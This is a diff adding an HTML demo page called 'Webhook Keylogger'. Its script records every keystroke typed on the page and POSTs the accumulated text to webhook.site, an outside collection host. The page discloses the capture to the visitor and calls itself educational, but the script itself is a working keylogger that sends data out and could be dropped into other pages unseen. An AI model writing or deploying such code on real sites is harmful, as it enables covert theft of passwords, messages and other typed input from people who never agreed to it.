@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Keylogger Test</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #f8f9fa;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 1rem 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .main-section {
+            max-width: 1200px;
+            margin: 3rem auto;
+            padding: 0 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+        
+        .card h2 {
+            color: #333;
+            margin-bottom: 1rem;
+            font-size: 2rem;
+        }
+        
+        .card p {
+            color: #666;
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+        }
+        
+        #log {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            padding: 20px;
+            min-height: 150px;
+            font-size: 1.2rem;
+            font-family: 'Courier New', monospace;
+            color: #2d3748;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+            word-wrap: break-word;
+            transition: all 0.3s ease;
+        }
+        
+        #log:focus {
+            outline: none;
+            border-color: #764ba2;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05), 0 0 0 3px rgba(118,75,162,0.1);
+        }
+        
+        .info-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+        
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        
+        .stat-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        
+        .stat-box .number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-box .label {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        
+        footer {
+            background: #2d3748;
+            color: white;
+            text-align: center;
+            padding: 2rem;
+            margin-top: 4rem;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-keyboard"></i>
+                Webhook Keylogger
+            </div>
+        </div>
+    </header>
+
+    <div class="main-section">
+        <div class="card">
+            <div class="info-badge">
+                <i class="fas fa-info-circle"></i>
+                Live Demo
+            </div>
+            <h2>Type Anywhere on This Page</h2>
+            <p>All keystrokes are captured and sent to Webhook.site in real-time</p>
+            
+            <div id="log" contenteditable="true" placeholder="Start typing..."></div>
+            
+            <div class="stats-container">
+                <div class="stat-box">
+                    <div class="number" id="keyCount">0</div>
+                    <div class="label">Keys Pressed</div>
+                </div>
+                <div class="stat-box">
+                    <div class="number" id="requestCount">0</div>
+                    <div class="label">Requests Sent</div>
+                </div>
+                <div class="stat-box">
+                    <div class="number pulse" id="status">🟢</div>
+                    <div class="label">Status</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Webhook Keylogger Demo. For educational purposes only.</p>
+    </footer>
+
+    <script>
+        let keyCount = 0;
+        let requestCount = 0;
+        const keylogger = '';
+        
+        document.addEventListener('keydown', function(e) {
+            // 1. Get the display element
+            const logDiv = document.getElementById('log');
+            
+            // 2. Add the key to the screen
+            logDiv.innerText += e.key;
+            
+            // 3. Update key count
+            keyCount++;
+            document.getElementById('keyCount').innerText = keyCount;
+
+            // 4. Send the request
+            fetch(`https://webhook.site/${keylogger}`, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: "Logged: " + logDiv.innerText
+            })
+            .then(function() {
+                console.log("Success: Sent '" + e.key + "' to Webhook.site");
+                requestCount++;
+                document.getElementById('requestCount').innerText = requestCount;
+            })
+            .catch(function(err) {
+                console.log("Fetch Error:", err);
+                document.getElementById('status').innerText = '🔴';
+            });
+        });
+    </script>
+</body>
+</html>
